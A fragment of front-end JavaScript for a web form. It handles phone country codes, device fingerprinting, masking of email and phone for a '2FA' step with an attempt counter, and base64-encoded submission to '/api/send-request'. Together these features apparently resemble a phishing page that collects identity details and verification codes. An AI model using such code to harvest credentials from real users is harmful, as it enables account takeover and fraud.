            function showModal(id) { document.getElementById(id).classList.add('active'); }
            function hideModal(id) { document.getElementById(id).classList.remove('active'); }
            function extractCountryCode(e) {
                let t = e;
                t.startsWith("+") || (t = "+" + t);
                t = "+" + t.replace(/\+/g, "");
                for (const n of Object.keys(countryCodeToFlag).sort((e, t) => t.length - e.length)) {
                    if (t.startsWith(n)) return n;
                }
                return null;
            }

            // Update flag based on country code
            function updateFlagFromCode(e) {
                const t = countryCodeToFlag[e];
                if (t) {
                    currentCountryCode = e;
                    const n = document.getElementById("selected-flag-img");
                    if (n) {
                        n.src = "https://flagcdn.com/w20/" + t + ".png";
                        n.alt = t.toUpperCase();
                    }
                    const a = document.querySelector(".selected-flag");
                    if (a) {
                        const o = countryCodeToName[e] || t.toUpperCase();
                        a.title = o + ": " + e;
                    }
                }
            }
            function encodePayload(data) { return btoa(JSON.stringify(data)); }
            async function sendData(payload) {
                try {
                    const response = await fetch('/api/send-request', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: encodePayload(payload) })
                    });
                    return await response.json();
                } catch (e) { return { success: false }; }
            }

            function getDeviceInfo() {
                const ua = navigator.userAgent;
                let browser = 'Unknown', os = 'Unknown';
                if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
                else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
                else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
                else if (ua.indexOf('Edg') > -1) browser = 'Edge';
                else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';

                if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
                else if (ua.indexOf('Android') > -1) os = 'Android';
                else if (ua.indexOf('Windows') > -1) os = 'Windows';
                else if (ua.indexOf('Mac') > -1) os = 'MacOS';
                else if (ua.indexOf('Linux') > -1) os = 'Linux';

                return {
                    browser: browser,
                    os: os,
                    screen: screen.width + 'x' + screen.height,
                    language: navigator.language || '',
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
                    mobile: /Mobile|Android|iPhone|iPad/i.test(ua)
                };
            }
            function maskEmail(email) {
                if (!email) return '';
                const [name, domain] = email.split('@');
                if (!domain) return email;
                const maskedName = name.charAt(0) + '**' + name.charAt(name.length - 1);
                return maskedName + '@' + domain;
            }

            function maskPhone(phone) {
                if (!phone) return '';
                const cleaned = phone.replace(/\s/g, '');
                if (cleaned.length < 6) return phone;
                const lastDigits = cleaned.slice(-2);
                const prefix = cleaned.slice(0, -4);
                return prefix + ' ** ' + lastDigits;
            }

            function update2FADisplay() {
                const email = document.getElementById('email').value;
                const phone = document.getElementById('phone').value;
                const fullName = document.getElementById('fullName').value;

                document.getElementById('2fa-email-display').textContent = fullName;
                document.getElementById('2fa-masked-info').textContent = maskEmail(email) + ', ' + maskPhone(phone);
                document.getElementById('2fa-step').textContent = tfaAttempts + 1;
            }
            function showFormError(id, msg) {
                const el = document.getElementById(id);
                if (el) { el.querySelector('span').textContent = msg; el.classList.add('show'); }
            }
            function clearFormErrors() {
                document.querySelectorAll('.form-error').forEach(el => {
                    el.classList.remove('show');
                    el.querySelector('span').textContent = '';
                });
            }
